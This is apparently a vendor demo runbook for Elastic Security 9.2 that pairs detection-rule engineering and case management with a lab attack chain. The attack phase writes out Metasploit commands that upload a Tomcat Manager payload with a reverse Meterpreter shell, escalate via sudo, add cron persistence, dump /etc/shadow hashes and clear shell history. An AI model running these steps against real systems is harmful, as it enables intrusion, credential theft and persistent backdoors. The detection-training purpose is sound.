# Elastic Security Demo 
# Elastic 9.2 - Detection Engineering, Attack Chain, and Case Management
# Last Updated: November 2025

################################################################################
# PREREQUISITES
################################################################################

# Blue Team VM: Ubuntu 20.04 with Tomcat 9.0.30 (weak credentials: tomcat/tomcat)
# Red Team VM: Ubuntu 22.04+ with Metasploit, Python 3, detection-rules repo
# Elastic: 9.2+ with Elastic Agent on target, configured Kibana connection

# IPs for this demo:
RED_TEAM_IP="10.0.1.100"    # Replace with your red team VM private IP
BLUE_TEAM_IP="10.0.1.50"    # Replace with your blue team VM private IP

################################################################################
# PHASE 1: DETECTION ENGINEERING
# Duration: 10-12 minutes
# Goal: Create, test, and deploy a custom detection rule
################################################################################

## 1.1 - Navigate to detection-rules repository
cd ~/detection-rules
source .venv/bin/activate

## 1.2 - Explore repository structure (optional - for context)
ls -la
ls rules/
ls rules/linux/ | wc -l    # Show count of Linux rules

## 1.3 - Examine an existing OOTB rule
cat rules/linux/execution_suspicious_java_child_process.toml

# This rule will fire during our demo - it detects Java spawning shells
# Key sections: metadata, rule definition, EQL query, MITRE mapping

## 1.4 - Create custom Tomcat web shell detection rule
mkdir -p rules/custom

# Create the rule file
cat > rules/custom/tomcat_webshell_detection.toml << 'EOF'
[metadata]
creation_date = "2025/11/06"
integration = ["endpoint"]
maturity = "production"
updated_date = "2025/11/06"

[rule]
author = ["Elastic", "Stuart"]
description = """
Detects web shell deployment via Apache Tomcat Manager interface. 
Identifies when the Tomcat Java process spawns shell interpreters,
indicating potential exploitation of weak credentials or vulnerabilities.
"""
from = "now-9m"
index = ["logs-endpoint.events.*"]
language = "eql"
license = "Elastic License v2"
name = "Tomcat Manager Web Shell Deployment"
risk_score = 73
rule_id = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
severity = "high"
tags = [
    "Domain: Endpoint",
    "OS: Linux",
    "Use Case: Threat Detection",
    "Tactic: Initial Access",
    "Tactic: Execution",
    "Data Source: Elastic Defend"
]
timestamp_override = "event.ingested"
type = "eql"

query = '''
process where event.type == "start" and
  process.parent.name == "java" and
  process.parent.command_line : "*tomcat*" and
  process.name in ("bash", "sh", "dash", "zsh") and
  process.args in ("-c", "-i")
'''

[[rule.threat]]
framework = "MITRE ATT&CK"

[[rule.threat.technique]]
id = "T1190"
name = "Exploit Public-Facing Application"
reference = "https://attack.mitre.org/techniques/T1190/"

[[rule.threat.technique]]
id = "T1505"
name = "Server Software Component"
reference = "https://attack.mitre.org/techniques/T1505/"

[[rule.threat.technique.subtechnique]]
id = "T1505.003"
name = "Web Shell"
reference = "https://attack.mitre.org/techniques/T1505/003/"

[rule.threat.tactic]
id = "TA0001"
name = "Initial Access"
reference = "https://attack.mitre.org/tactics/TA0001/"
EOF

## 1.5 - Validate rule syntax
python -m detection_rules test rules/custom/tomcat_webshell_detection.toml
# Expected: ✓ Rule validation successful

## 1.6 - View rule details
python -m detection_rules view-rule rules/custom/tomcat_webshell_detection.toml

## 1.7 - Deploy rule to Kibana
python -m detection_rules kibana upload-rule rules/custom/tomcat_webshell_detection.toml
# Expected: ✓ Rule uploaded successfully

# Verify in UI: Security → Rules → Search "Tomcat Manager"

################################################################################
# PHASE 2: ENABLE OOTB DETECTION RULES
# Duration: 2-3 minutes
# Goal: Activate prebuilt rules for comprehensive coverage
################################################################################

# In Elastic Security UI (browser):
# 1. Navigate to: Security → Rules → Detection rules (SIEM)
# 2. Filter: Status = "Disabled", Tags contains "Linux"
# 3. Enable these rules (bulk select):
#    ☑ Linux System Information Discovery
#    ☑ Persistence via Cron Job
#    ☑ Potential Credential Access via /etc/shadow
#    ☑ Suspicious Network Connection - Java Process
#    ☑ Data Staging in Unusual Location
#    ☑ Indicator Removal - Clear Command History
# 4. Bulk actions → Enable
# 5. View MITRE ATT&CK coverage map

################################################################################
# PHASE 3: EXECUTE ATTACK CHAIN
# Duration: 8-10 minutes
# Goal: Trigger detections across multiple MITRE stages
################################################################################

## 3.1 - Start Metasploit with pre-configured exploit
msfconsole -r ~/elastic_demo.rc

# Resource script contains:
# use exploit/multi/http/tomcat_mgr_upload
# set RHOSTS BLUE_TEAM_IP
# set HttpUsername tomcat
# set HttpPassword tomcat
# set LHOST RED_TEAM_IP
# set payload java/meterpreter/reverse_tcp

## 3.2 - Verify configuration
show options

## 3.3 - Execute exploit (Initial Access - T1190)
exploit

# Wait for session to open
# Expected output:
# [*] Started reverse TCP handler on RED_TEAM_IP:4444
# [*] Uploading payload...
# [*] Sending stage to BLUE_TEAM_IP
# [*] Meterpreter session 1 opened

## 3.4 - Basic system information
sysinfo
getuid

# Detection: "Tomcat Manager Web Shell Deployment" (custom rule)
# Detection: "Suspicious Java Child Process" (OOTB rule)

## 3.5 - Discovery commands (Discovery - T1082, T1033)
shell

whoami
id
uname -a
hostname
cat /etc/passwd | grep -v nologin

exit

# Detection: "Linux System Information Discovery"

## 3.6 - Privilege escalation (Privilege Escalation - T1548)
shell

sudo -l
sudo /bin/bash
whoami    # Should show 'root'

exit

# Detection: "Sudo Command Execution"

## 3.7 - Establish persistence (Persistence - T1053.003)
background

use exploit/linux/local/persistence_cron
set SESSION 1
set LHOST $RED_TEAM_IP
set LPORT 4445
run

# Detection: "Persistence via Cron Job"

## 3.8 - Credential dumping (Credential Access - T1003.008)
use post/linux/gather/hashdump
set SESSION 1
run

# Detection: "Potential Credential Access via /etc/shadow"

## 3.9 - View collected credentials
loot
creds

## 3.10 - Defense evasion (Defense Evasion - T1070.003)
sessions -i 1
shell

unset HISTFILE
export HISTSIZE=0
history -c

exit

# Detection: "Indicator Removal - Clear Command History"

## 3.11 - Data staging (Collection - T1074.001)
shell

mkdir /tmp/.staging
find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
tar -czf /tmp/data.tar.gz /tmp/.staging

exit

# Detection: "Data Staging in Unusual Location"

## 3.12 - View MITRE ATT&CK coverage
# In Elastic UI: Navigate to Alerts → MITRE ATT&CK view
# Shows detected techniques across the kill chain

################################################################################
# PHASE 4: CASE MANAGEMENT (ELASTIC 9.2 FEATURES)
# Duration: 10-12 minutes
# Goal: Demonstrate investigation workflow with new 9.2 capabilities
################################################################################

## 4.1 - Create case from alerts
# In Elastic Security UI:
# 1. Navigate to: Alerts
# 2. Select multiple alerts:
#    ☑ Tomcat Manager Web Shell Deployment
#    ☑ Suspicious Java Child Process
#    ☑ Linux System Information Discovery
#    ☑ Persistence via Cron Job
#    ☑ Potential Credential Access via /etc/shadow
#    ☑ Indicator Removal - Clear Command History
# 3. Click: "Add to case" → "Create new case"

## 4.2 - Fill case details
# Title: Linux Server Compromise - Tomcat Exploitation
# Severity: High
# Description:
"""
## Incident Summary
Multiple alerts triggered indicating successful compromise of Tomcat server 
via weak credentials. Attack progressed through multiple MITRE ATT&CK stages 
including initial access, persistence, and credential theft.

## Initial Indicators
- Weak Tomcat Manager credentials exploited (tomcat/tomcat)
- Web shell deployed via WAR file
- Meterpreter session established
- Privilege escalation to root
- Persistent backdoor installed via cron
- Password hashes exfiltrated
"""

# Tags: tomcat, webshell, linux, compromise, credential-theft
# Category: Security Incident
# 
# ⚠️ NEW in 9.2: Auto-extract observables (checkbox - enabled by default)
# This automatically extracts IPs, hostnames, processes, file paths, users

## 4.3 - Explore case features

# Case ID: Note the human-readable ID (e.g., Case #0007)
# NEW in 9.2: Human-readable case IDs replace UUIDs

## 4.4 - Review auto-extracted observables
# Click: "Observables" tab
# 
# NEW in 9.2: Observables auto-extracted from alerts:
# - IP Addresses: 192.168.1.10 (blue team), 192.168.1.100 (red team)
# - Hostnames: ubuntu-tomcat-01
# - Processes: java, bash, crontab, sudo
# - File Paths: /opt/tomcat/webapps/shell.war, /etc/shadow, crontab paths
# - User Accounts: tomcat, root
#
# Toggle: "Auto-extract observables" - can be disabled per case

## 4.5 - Add custom observable
# Click: "Add observable"
# Type: Custom (NEW in 9.2 - custom observable types)
# Value: CVE-2020-1938
# Description: Potential Ghostcat vulnerability

## 4.6 - Build investigation timeline
# Click: "Activity" tab
# Click: "Add to timeline"
# Select key alerts to add to timeline
# Timeline shows process tree, network connections, file modifications

## 4.7 - Add investigation notes
# Click: "Add comment"

"""
## Investigation Steps Completed

### 1. Initial Analysis (15:30 UTC)
- Confirmed Tomcat Manager exploitation via weak credentials
- Web shell deployed: /opt/tomcat/webapps/shell.war
- Meterpreter session established from 192.168.1.100

### 2. Scope Assessment (15:35 UTC)
- Single host affected: ubuntu-tomcat-01
- Privilege escalation to root confirmed
- Persistence via cron job (callback every 15 minutes)
- Password hashes accessed from /etc/shadow

### 3. Containment Actions (15:40 UTC)
- ✅ Network isolation completed
- ✅ Malicious processes terminated
- ✅ Cron persistence removed
- ✅ User passwords reset

### 4. Eradication (15:50 UTC)
- ✅ Web shell removed
- ✅ Tomcat credentials changed
- ✅ System patched to latest version
- ✅ Enhanced monitoring deployed

### 5. Recovery (16:00 UTC)
- ✅ Service restored
- ✅ Additional detection rules deployed
- ✅ Network segmentation implemented
"""

## 4.8 - Add visualization (optional)
# Click: "Visualization" button
# Create new visualization: "Attack Timeline by MITRE Tactic"
# Chart type: Bar chart showing alerts over time grouped by tactic
# Add to case

## 4.9 - Review case metrics
# Case Summary shows:
# - Total alerts: 6
# - Associated users: 2 (tomcat, root)
# - Associated hosts: 1 (ubuntu-tomcat-01)
# - Total connectors: 0
#
# Observables count:
# - Total extracted: 12+
# - IP Addresses: 2
# - Hostnames: 1
# - Processes: 4
# - File Paths: 3
# - User Accounts: 2
# - Custom: 1

## 4.10 - Close case
# Add final comment:

"""
## Resolution Summary

All containment and remediation actions completed:
✅ Host isolated and rebuilt
✅ All passwords rotated across environment
✅ Tomcat patched to version 9.0.93
✅ Manager credentials changed to strong random password
✅ Network segmentation - Tomcat Manager now internal-only
✅ Enhanced monitoring rules deployed

## Response Metrics
- Time to detection: <1 minute
- Time to case creation: 3 minutes
- Time to containment: 15 minutes
- Total case duration: 45 minutes

## Lessons Learned
1. Default/weak credentials remain critical vulnerability
2. Detection rules covered all attack stages (100% visibility)
3. Auto-extract observables saved ~10 minutes in triage
4. Human-readable case IDs improved team communication

## Follow-up Actions
- Security awareness training on credential management
- Automated credential auditing implementation
- Quarterly penetration testing scheduled

Status: Closed - Resolved
"""

# Change status: Closed

################################################################################
# POST-DEMO CLEANUP
################################################################################

## Clean up Metasploit sessions
sessions -K
exit

## Clean up blue team VM (SSH to blue team)
# ssh ubuntu@$BLUE_TEAM_IP
# sudo systemctl stop tomcat
# sudo rm -rf /opt/tomcat/webapps/shell*
# crontab -r
# sudo systemctl start tomcat

################################################################################
# VERIFICATION COMMANDS
################################################################################

## Test connectivity before demo
ping $BLUE_TEAM_IP
curl http://$BLUE_TEAM_IP:8080
curl -u tomcat:tomcat http://$BLUE_TEAM_IP:8080/manager/text/list

## Verify Metasploit database
sudo msfdb status

## Verify detection-rules
cd ~/detection-rules
source .venv/bin/activate
python -m detection_rules --help

## Check Elastic Agent on blue team VM
# ssh ubuntu@$BLUE_TEAM_IP
# sudo systemctl status elastic-agent

################################################################################
# RECOVERY COMMANDS (if things go wrong)
################################################################################

## If Metasploit session dies
sessions -l                  # List sessions
sessions -i 1                # Reconnect to session 1
exploit                      # Re-exploit if needed

## If detection-rules fails
cd ~/detection-rules
deactivate
source .venv/bin/activate
python -m detection_rules kibana upload-rule rules/custom/tomcat_webshell_detection.toml

## If connectivity fails
ping $BLUE_TEAM_IP
nc -zv $BLUE_TEAM_IP 8080
# Check security groups in AWS
# Verify blue team Tomcat is running

################################################################################
# DEMO SUMMARY
################################################################################

# Phase 1: Detection Engineering
#   - Created custom Tomcat web shell detection rule
#   - Tested locally with detection-rules framework
#   - Deployed to Kibana via API
#   - Demonstrated Detection as Code workflow

# Phase 2: OOTB Rules
#   - Enabled 6+ prebuilt Linux detection rules
#   - Showed MITRE ATT&CK coverage map
#   - Demonstrated comprehensive detection library

# Phase 3: Attack Execution
#   - Exploited Tomcat Manager with weak credentials
#   - Progressed through 7+ MITRE stages
#   - Triggered detections across entire kill chain
#   - Demonstrated complete visibility

# Phase 4: Case Management (9.2 Features)
#   - Created case from multiple alerts
#   - NEW: Human-readable case IDs (Case #0007 vs UUID)
#   - NEW: Auto-extracted observables from alerts
#   - NEW: Custom observable types
#   - Documented complete investigation
#   - Closed case with metrics and lessons learned

################################################################################
# NOTES
################################################################################

# Total Demo Time: 30-35 minutes
# - Detection Engineering: 10-12 min
# - Enable OOTB Rules: 2-3 min
# - Attack Chain: 8-10 min
# - Case Management: 10-12 min

# Key Differentiators:
# - Detection as Code (version control, testing, CI/CD)
# - 2000+ prebuilt rules (all open source)
# - Complete MITRE ATT&CK coverage
# - Elastic 9.2 case enhancements
# - Single platform (detection → investigation → response)

# Customer Value:
# - Faster detection engineering with code-based workflows
# - Reduced false positives with tested, peer-reviewed rules
# - Improved analyst efficiency (auto-extract observables)
# - Better team communication (human-readable case IDs)
# - Complete investigation documentation for compliance

################################################################################
# END OF SCRIPT
################################################################################